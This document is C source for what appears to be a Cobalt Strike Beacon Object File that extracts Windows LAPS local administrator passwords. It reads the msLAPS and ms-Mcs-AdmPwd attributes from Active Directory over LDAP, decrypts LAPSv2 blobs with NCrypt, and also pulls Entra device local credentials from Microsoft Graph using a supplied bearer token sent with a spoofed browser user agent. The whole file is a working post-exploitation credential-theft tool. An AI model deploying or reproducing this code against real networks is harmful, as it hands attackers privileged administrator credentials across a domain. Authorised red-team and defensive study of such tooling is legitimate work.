#include <stdio.h>
#include <wchar.h>
#include <malloc.h>
#include <stdlib.h>
#include <Windows.h>
#include <ncrypt.h>
#include <ncryptprotect.h>
#include <sddl.h>
#include <Winldap.h>
#include <winhttp.h>
#include "base\helpers.h"

#define PROGVERS "1.4.0"
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {

#include "beacon.h"

    #define ARRLEN(arr) (sizeof(arr) / sizeof(arr[0]))

    DFR(MSVCRT, malloc);
    DFR(MSVCRT, sprintf);
    DFR(MSVCRT, _swprintf);      
    DFR(MSVCRT, free);
    DFR(KERNEL32, GetLastError);
    #define malloc MSVCRT$malloc
    #define sprintf MSVCRT$sprintf
    #define _swprintf MSVCRT$_swprintf
    #define free MSVCRT$free
    #define GetLastError KERNEL32$GetLastError

    struct blob_header {
        unsigned int upperdate;
        unsigned int lowerdate;
        unsigned int encryptedBufferSize;
        unsigned int flags;
    };

    size_t wcslen(const wchar_t* str) {
        size_t len = 0;
        while (*str != L'\0') {
            len++;
            str++;
        }

        return len;
    }

    size_t strlen(const char* str) {
        size_t len = 0;
        while (*str != '\0') {
            len++;
            str++;
        }
        return len;
    }

    int strcmp(const char *str1, const char *str2) {
        while (*str1 && (*str1 == *str2)) {
            str1++;
            str2++;
        }
        return *(unsigned char*)str1 - *(unsigned char*)str2;
    }

    bool searchLdap(PSTR ldapServer, ULONG port, PCHAR distinguishedName, PCHAR searchFilter, char **output, int* length, char** output2, int* length2) {

        DFR_LOCAL(wldap32, ldap_initA);
        DFR_LOCAL(wldap32, ldap_bind_sA);
        DFR_LOCAL(wldap32, ldap_unbind);
        DFR_LOCAL(wldap32, ldap_search_s);
        DFR_LOCAL(wldap32, ldap_count_entries);
        DFR_LOCAL(wldap32, ldap_first_entry);
        DFR_LOCAL(wldap32, ldap_get_values_lenA);
        DFR_LOCAL(wldap32, ldap_get_values);
        DFR_LOCAL(wldap32, ldap_msgfree);

        LDAP *ldapHandle;
        PLDAPMessage searchResult = NULL;
        PCHAR attr[] = { "msLAPS-EncryptedPassword", "msLAPS-PasswordExpirationTime", "msLAPS-Password", "msLAPS-EncryptedPasswordHistory", "msLAPS-EncryptedDSRMPassword", "msLAPS-EncryptedDSRMPasswordHistory", "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime", NULL};
        ULONG entryCount;
        PLDAPMessage firstEntry = NULL;
        berval** outval;
        berval** outval1;

        ldapHandle = ldap_initA(ldapServer, port);
        if (ldapHandle == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "Error Initialising LDAP connection: ldap_initA");
            return false;
        }

        if (ldap_bind_sA(ldapHandle, distinguishedName, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "Error Initialising LDAP connection: ldap_bind_sA");
            //Safety
            ldap_unbind(ldapHandle);
            return false;
        }
            
        if (ldap_search_s(ldapHandle, distinguishedName, LDAP_SCOPE_SUBTREE, searchFilter, attr, 0, &searchResult) != LDAP_SUCCESS) {
            
            if (searchResult != NULL) ldap_msgfree(searchResult);

            BeaconPrintf(CALLBACK_ERROR, "Error Using LDAP connection: ldap_search_s");
            ldap_unbind(ldapHandle);
            return false;
        }

        entryCount = ldap_count_entries(ldapHandle, searchResult);
        if (entryCount == 0) {

            if (searchResult != NULL) ldap_msgfree(searchResult);

            BeaconPrintf(CALLBACK_ERROR, "0 results found from LDAP");
            return false;
        }

        firstEntry = ldap_first_entry(ldapHandle, searchResult);
        if (firstEntry == NULL) {

            if (searchResult != NULL) ldap_msgfree(searchResult);

            BeaconPrintf(CALLBACK_ERROR, "Error ldap_first_entry");
            ldap_unbind(ldapHandle);
            return false;
        }

        outval = ldap_get_values_lenA(ldapHandle, firstEntry, attr[0]);
        
        if (outval == NULL) {

            if (searchResult != NULL) ldap_msgfree(searchResult);

            //TODO: ChatGPT Safety note  
            // ldap_msgfree is only for LDAPMessage* chains like searchResult. firstEntry is just a pointer inside that chain. Do not free it separately.
            //if (firstEntry != NULL)
            //    ldap_msgfree(firstEntry);
            
            BeaconPrintf(CALLBACK_ERROR, "Error ldap_get_values_lenA: msLAPS-EncryptedPassword:");
            ldap_unbind(ldapHandle);
            return false;
        }

        outval1 = ldap_get_values_lenA(ldapHandle, firstEntry, attr[1]);
        if (outval1 == NULL) {

            if (searchResult != NULL) ldap_msgfree(searchResult);
            
            //TODO: ChatGPT Safety note
            //Problem: ldap_msgfree is only for LDAPMessage* chains like searchResult. firstEntry is just a pointer inside that chain. Do not free it separately.
            //if (firstEntry != NULL)
            //    ldap_msgfree(firstEntry);

            BeaconPrintf(CALLBACK_ERROR, "Error ldap_get_values_lenA: msLAPS-PasswordExpirationTime:");
            ldap_unbind(ldapHandle);
            return false;
        }

        *output = (char*)outval[0]->bv_val;
        *length = outval[0]->bv_len;
        *output2 = (char*)outval1[0]->bv_val;
        *length2 = outval1[0]->bv_len;

        ldap_unbind(ldapHandle);
        return true;
    }

    const char* GetMonthAbbrev(int month) {
        const char* mon[] = {
            "Jan", "Feb", "Mar", "Apr", "May", "Jun",
            "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
        };

        if (month < 1 || month > 12) return "!?ERR?!";
        return mon[month - 1];
    }

    PCHAR ConvertADTimestampToHumanTime(PUCHAR vRawTimestamp, INT intRawLen) {

        CHAR* buf;
        FILETIME ft;
        SYSTEMTIME stUTC;
        ULONGLONG ullTime;
        PCHAR sADTime = (PCHAR) vRawTimestamp;
        DFR_LOCAL(KERNEL32, FileTimeToSystemTime);
        DFR_LOCAL(MSVCRT, _strtoi64);

        buf = (CHAR*)malloc(64 * sizeof(CHAR));
        // Expect timestamp from AD should be 18 characters. If not something wrong, spec changed, or possibly it's in a different metric unit. Bail.
        if (intRawLen != 18) {
            BeaconPrintf(CALLBACK_ERROR, "WARNING: ADTime doesnt appear to be valid. HumanTime may be erroneous. Returning Error.\n.");
            sprintf(buf, "HUMANTIME_CONVERSION_FAIL");
            return (PCHAR)buf;
        }

        // Have to conditional stoll for mingw plebs
        ullTime = _strtoi64(sADTime, nullptr, 0x0A);

        //
        // TODO: Errno return sanity checks for ERANGE if we deem it necessary.
        //

        // Manual C-style reinterpret casts
        *(__int64*)&ft = ullTime;

        if (!FileTimeToSystemTime(&ft, &stUTC)) {
            //BeaconPrintf(CALLBACK_ERROR, "Error: FileTimeToSystemTime conversion failed.");
            sprintf(buf, "HUMANTIME_CONVERSION_FAIL");
            return (PCHAR)buf;
        }

        // Unsure if this accounts for DSTs or LeapSecs
        if (FileTimeToSystemTime(&ft, &stUTC)) {
            sprintf(buf, "%s/%02d/%04d %02d:%02d:%02d UTC", GetMonthAbbrev(stUTC.wMonth), stUTC.wDay, stUTC.wYear, stUTC.wHour, stUTC.wMinute, stUTC.wSecond);
            return (PCHAR)buf;
        }
        else {
            sprintf(buf, "HUMANTIME_CONVERSION_FAIL");
            return (PCHAR)buf;
        }
    
    }

    char* ConvertWinFileTimeToHumanTime(unsigned int dwLowDateTime, unsigned int dwHighDateTime) {

        CHAR* buf;
        FILETIME ft;
        SYSTEMTIME stUTC;
        DFR_LOCAL(KERNEL32, FileTimeToSystemTime);

        ft.dwLowDateTime = dwLowDateTime;
        ft.dwHighDateTime =  dwHighDateTime;
        buf = (CHAR*)malloc(64 * sizeof(CHAR));

        // Unsure if this accounts for DSTs or LeapSecs
        if (FileTimeToSystemTime(&ft, &stUTC)) {
            sprintf(buf, "%s/%02d/%04d %02d:%02d:%02d UTC", GetMonthAbbrev(stUTC.wMonth), stUTC.wDay, stUTC.wYear, stUTC.wHour, stUTC.wMinute, stUTC.wSecond);
            return (CHAR*)buf;
        }
        else {
            sprintf(buf, "HUMANTIME_CONVERSION_FAIL");
            return (CHAR*)buf;
        }

    }

    WCHAR* RemoveSIDPrefix(WCHAR* ss) {
        
        
        DFR_LOCAL(KERNEL32, LocalFree);

        static WCHAR buf[256];
        DWORD ssLen = wcslen(ss);
        DWORD copyLen = ssLen - 4;

        if (ssLen <= 4) {
            // Should never hit but if so some shit gon wrong.
            buf[0] = L'\0';
            BeaconPrintf(CALLBACK_ERROR, "RemoveSIDPrefix minimum prefix len not met. Len = %d. Returning empty buffer. \n", ssLen);
            return buf;
        }

        if (copyLen >= 256) {
            // Larger than normal bounds. Inform user and proceed to minimize bound it.
            BeaconPrintf(CALLBACK_ERROR, "RemoveSIDPrefix maximum buf exceeded. Results may will truncate/error.\n");
            copyLen = 255;
            return buf;
        }

        for (DWORD i = 0; i < copyLen; i++) {
            buf[i] = ss[i + 4];
        }

        // Null-termination
        buf[copyLen] = L'\0';  
        return buf;

    }

    WCHAR* ConvertSIDToNTAccount(WCHAR* ss) {

        PSID pSid = NULL;
        WCHAR sidString[256];
        WCHAR name[256];
        WCHAR domain[256];
        SID_NAME_USE sidType;
        WCHAR* ntacct;
        DWORD nameSize = sizeof(name);
        DWORD domainSize = sizeof(domain);

        DFR_LOCAL(KERNEL32, LocalFree);
        DFR_LOCAL(ADVAPI32, ConvertStringSidToSidW);
        DFR_LOCAL(ADVAPI32, LookupAccountSidW);
        
        // We are presuming the SID is a single SID. This may fail on multiple accounts allowed to decrypt returned as a list?


        // Convert SID string to SID structure
        if (!ConvertStringSidToSidW(ss, &pSid)) {
            BeaconPrintf(CALLBACK_ERROR, "ConvertStringSidToSidW failed. Error %lu\n", GetLastError());
            //return ;
        }

        // Look up the NT account name
        if (!LookupAccountSidW(NULL, pSid, name, &nameSize, domain, &domainSize, &sidType)) {
            BeaconPrintf(CALLBACK_ERROR, "LookupAccountSidW failed. Error %lu\n", GetLastError());
            LocalFree(pSid);
            //return ;
        }

        ntacct = (WCHAR*)malloc(256 * sizeof(WCHAR));
        _swprintf((WCHAR*) ntacct, L" %ls\\%ls\n", domain, name);
        LocalFree(pSid);

        return (WCHAR*)ntacct;

    }

    SECURITY_STATUS WINAPI decryptCallback(
        void* pvCallbackCtxt,
        const BYTE* pbData,
        SIZE_T cbData,
        BOOL isFinal
        ) {

        formatp* b = (formatp*) pvCallbackCtxt;
        BeaconFormatPrintf(b, "Decrypting secret...\n");
        BeaconFormatPrintf(b, "Decrypted Output: %ls", pbData);

        return 0;
    }

    bool unprotectSecret(BYTE* protectedData, ULONG protectedDataLength) {

        formatp fBeaconOut;
        PSTR pBeaconFlush = NULL;
        INT intBeaconOutBufSize = 0;
        BeaconFormatAlloc(&fBeaconOut, 250);

        BYTE* secData = NULL;
        ULONG secDataLength = 0;
        SECURITY_STATUS error;

        DFR_LOCAL(NCRYPT, NCryptStreamOpenToUnprotect);
        DFR_LOCAL(NCRYPT, NCryptUnprotectSecret);
        DFR_LOCAL(NCRYPT, NCryptStreamUpdate);
        DFR_LOCAL(NCRYPT, NCryptStreamClose);
        DFR_LOCAL(NCRYPT, NCryptGetProtectionDescriptorInfo);
        DFR_LOCAL(KERNEL32, LocalFree);

        NCRYPT_PROTECT_STREAM_INFO streamInfo;
        NCRYPT_STREAM_HANDLE streamHandle;
        NCRYPT_DESCRIPTOR_HANDLE unprotectHandle;

        streamInfo.pfnStreamOutput = decryptCallback;
        streamInfo.pvCallbackCtxt = (void*) &fBeaconOut;

        NCRYPT_STREAM_HANDLE streamHandle2;
        void* actualSidString = nullptr;
        void** sidString = &actualSidString;
        WCHAR* sSidString = NULL;
        BYTE* sidData = NULL;
        ULONG sidLen = 0;

        if (error = NCryptUnprotectSecret(&unprotectHandle, 0x41, protectedData + 16, protectedDataLength - 16, NULL, NULL, &sidData, &sidLen) != 0) {
            BeaconPrintf(CALLBACK_ERROR, "NCryptUnprotectSecret failed with error: %x\n", error);
            LocalFree(sidData);
        }

        if (error = NCryptGetProtectionDescriptorInfo(unprotectHandle, NULL, 1, sidString) == 0) {
            BeaconFormatPrintf(&fBeaconOut, "Authorized SID Decryptor(s): %ls\n", (WCHAR*)(*sidString));
            sSidString = RemoveSIDPrefix((WCHAR*) *sidString);
            BeaconFormatPrintf(&fBeaconOut, "\t SID NT Account Name: %ls\n", ConvertSIDToNTAccount(sSidString));
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "NCryptGetProtectionDescriptorInfo failed with error: %x\n", error);
            LocalFree(sidString);
        }

        if ((error = NCryptStreamOpenToUnprotect(&streamInfo, NCRYPT_SILENT_FLAG, 0, &streamHandle)) != 0) {
            BeaconPrintf(CALLBACK_ERROR, "NCryptStreamOpenToUnprotect error: %x\n", error);
            return false;
        }

        if ((error = NCryptStreamUpdate(streamHandle, protectedData + 16, protectedDataLength - 16, true)) != 0) {
            NCryptStreamClose(streamHandle);
            BeaconPrintf(CALLBACK_ERROR, "NCryptStreamUpdate error: %x\n", error);
            return false;
        }

        pBeaconFlush = BeaconFormatToString(&fBeaconOut, &intBeaconOutBufSize);
        BeaconOutput(CALLBACK_OUTPUT, pBeaconFlush, intBeaconOutBufSize);
        BeaconFormatFree(&fBeaconOut);
        NCryptStreamClose(streamHandle);
        return true;
    }

    void doLAPSEntra(const char* authtoken, const char* device_id) {

        DFR_LOCAL(WINHTTP, WinHttpOpen);
        DFR_LOCAL(WINHTTP, WinHttpConnect);
        DFR_LOCAL(WINHTTP, WinHttpOpenRequest);
        DFR_LOCAL(WINHTTP, WinHttpAddRequestHeaders);
        DFR_LOCAL(WINHTTP, WinHttpSendRequest);
        DFR_LOCAL(WINHTTP, WinHttpReceiveResponse);
        DFR_LOCAL(WINHTTP, WinHttpReadData);
        DFR_LOCAL(WINHTTP, WinHttpCloseHandle);

        const wchar_t * dlc_endpoint = L"/v1.0/directory/deviceLocalCredentials/%ls?$select=credentials";
        wchar_t craftedurl[400] = { 0 };
        char* respBuff = (char*)malloc(55000);
        wchar_t* devid = NULL;
        wchar_t* authbear = NULL;
        wchar_t* authhdr = NULL;
        DWORD dataRead = 0;

        #ifdef DEBUGTEST
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUGTEST] Utilizng Fake Token and Device");
        devid = L"7a4b0435-b1a1-4788-9f04-7215c5ec8ee1";
        authbear = L"rSlWY2-LWNLvRUyJn5fKQn2KhfpuEPyXOqih9XB0OqyfAaxMdSybe2SUp919o1sqv6cEt8l8hBLVHIlDA4YauZx-4VApIn4sKWN64hvikILoeQ";
        #else
        authbear = (wchar_t*)malloc((strlen(authtoken) + 1) * sizeof(wchar_t));
        toWideChar((char*) authtoken, authbear, (((strlen(authtoken) + 1) * sizeof(wchar_t) )));
        devid = (wchar_t*)malloc(73 * sizeof(wchar_t));
        toWideChar((char*) device_id, devid, (((strlen(device_id) + 1) * sizeof(wchar_t) )));
        #endif

        authhdr = (wchar_t *)malloc((wcslen(authbear) + wcslen(L"Authorization: Bearer ") + 1) * sizeof(wchar_t));

        _swprintf(authhdr, L"Authorization: Bearer %ls", authbear);
        _swprintf(craftedurl, dlc_endpoint, devid);

        #ifdef DEBUGTEST
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUGTEST] Authorization Header is : %ls", authhdr);
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUGTEST] Crafted Graph Endpoint URL: %ls", craftedurl);
        #endif

        if (!respBuff) {
            BeaconPrintf(CALLBACK_ERROR, "Failed allocation for Response buffer.\n");
            return;
        }

        // Open session
        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", 
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
            NULL, 
            WINHTTP_NO_PROXY_BYPASS, 
            0);

        if (!hSession) {
            BeaconPrintf(CALLBACK_ERROR, "WinHttpOpen failed: %u\n", GetLastError());
            //BeaconPrintf(CALLBACK_ERROR, "WinHttpOpen failed.\n");
            return;
        }

        // Connect
        HINTERNET hConnect = WinHttpConnect(hSession, L"graph.microsoft.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConnect) {
            BeaconPrintf(CALLBACK_ERROR, "WinHttpConnect failed: %u\n", GetLastError());
            //BeaconPrintf(CALLBACK_ERROR, "WinHttpConnect failed.");
            WinHttpCloseHandle(hSession);
            return;
        }

        // WinHTTP To Send Request
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", craftedurl, 
            NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (!hRequest) {

            BeaconPrintf(CALLBACK_ERROR, "WinHttpOpenRequest failed: %u\n", GetLastError());
            //BeaconPrintf(CALLBACK_ERROR, "WinHttpOpenRequest failed.");
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return;
        }

        // Add headers
        WinHttpAddRequestHeaders(hRequest, L"x-client-SKU: MSAL.CoreCLR\r\nocp-client-version: 10.0.26100\r\nocp-client-name: Windows\r\n", 
            -1L, WINHTTP_ADDREQ_FLAG_ADD);
        WinHttpAddRequestHeaders(hRequest, authhdr, -1L, WINHTTP_ADDREQ_FLAG_ADD);

        // Send request
        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "WinHttpSendRequest failed: %u\n", GetLastError());
            //BeaconPrintf(CALLBACK_ERROR, "WinHttpSendRequest failed.");
        }

        // Receive response
        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            BeaconPrintf(CALLBACK_ERROR, "WinHttpReceiveResponse failed: %u\n", GetLastError());
            //BeaconPrintf(CALLBACK_ERROR, "WinHttpReceiveResponse failed.");
        }

        // Read response chunks
        BOOL bResults = TRUE;
        DWORD totalRead = 0;
        do {
            dataRead = 0;
            bResults = WinHttpReadData(hRequest, (LPVOID)(respBuff + totalRead), 55000 - totalRead, &dataRead);
            totalRead += dataRead;
        } while (bResults && dataRead > 0);

        // Output
        respBuff[totalRead] = '\0';
        BeaconPrintf(CALLBACK_OUTPUT, "MSGraph Response: %s", respBuff);

        // Cleanup
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);
        if (respBuff) free(respBuff);
        if (devid) free(devid);
        if (authbear) free(authbear);
        if (authhdr) free(authhdr);

    }

    void go(char* args, int len) {

        unsigned char *output, *output2;
        int length, length2;
        struct blob_header* header;
        datap  parser;
        
        char* lapsmode;
        char* authtoken;
        char* device_id;
        char* domainController;
        char* distinguishedName;
        char* rootDN;
        char ldapSearch[1024];
        int stringSize = 0;

        BeaconDataParse(&parser, args, len);
        lapsmode = BeaconDataExtract(&parser, NULL);


        if (strcmp("ENTRA", lapsmode) == 0) {

            BeaconPrintf(CALLBACK_OUTPUT, "AZURE AD MODE"); 
            authtoken = BeaconDataExtract(&parser, NULL);
            device_id = BeaconDataExtract(&parser, &stringSize);
            doLAPSEntra(authtoken, device_id);
        }
        else if (strcmp("LAPS", lapsmode) == 0 ) {

            BeaconPrintf(CALLBACK_OUTPUT, "ON-PREM AD MODE");     
            domainController = BeaconDataExtract(&parser, NULL);
            rootDN = BeaconDataExtract(&parser, NULL);
            distinguishedName = BeaconDataExtract(&parser, &stringSize);

            if (stringSize > sizeof(ldapSearch) - 45) {
            //Don't want an accidental overflow crashing the BOF
                ldapSearch[1024 - 45] = '\0';
            }

            sprintf(ldapSearch, "(&(objectClass=computer)(distinguishedName=%s))", distinguishedName);
            if (!searchLdap(domainController, 389, rootDN, ldapSearch, (char**)&output, &length, (char**)&output2, &length2)) {
                return;
            }

            header = (struct blob_header*)output;
            BeaconPrintf(CALLBACK_OUTPUT, "=== LAPSv2 Account Information ===:\nUpper Date Timestamp: %d\nLower Date Timestamp: %d\nPassword Expiry Date: %s \nPassword Last Update: %s\nEncrypted Buffer Size: %d\nFlags: %d\n", header->upperdate, header->lowerdate, ConvertADTimestampToHumanTime(output2, length2), ConvertWinFileTimeToHumanTime(header->lowerdate, header->upperdate), header->encryptedBufferSize, header->flags);
            if (header->encryptedBufferSize != length - sizeof(struct blob_header)) {
                BeaconPrintf(CALLBACK_ERROR, "Header Length (%d) and LDAP Returned Length (%d) Don't Match.. decryption may fail", header->encryptedBufferSize, length-sizeof(blob_header));
            }

            if (!unprotectSecret((BYTE*)output, length)) {
                BeaconPrintf(CALLBACK_ERROR, "Could not unprotect LAPS creds");
                return;
            }
        }
        else {

                BeaconPrintf(CALLBACK_ERROR, "UNKNOWN MODE"); 
                return;
        }


        
    }
}
#
